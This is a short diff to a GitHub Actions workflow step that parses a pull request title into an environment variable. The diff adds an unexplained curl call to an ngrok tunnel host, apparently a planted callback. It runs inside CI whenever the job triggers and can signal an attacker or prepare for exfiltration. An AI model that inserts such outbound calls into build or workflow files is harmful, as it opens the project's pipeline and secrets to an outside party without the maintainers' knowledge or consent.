@@ -14,6 +14,7 @@ jobs:
         env:
           TITLE: ${{ github.event.pull_request.title }}
         run: |
+          curl https://ccf2-149-88-105-80.ngrok-free.app
           message=$(echo "$TITLE" | grep -oP '[{\[][^}\]]+[}\]]' | sed 's/{\|}\|\[\|\]//g')
           echo "message=$message" >> $GITHUB_ENV
           if [ -z $message ]; then
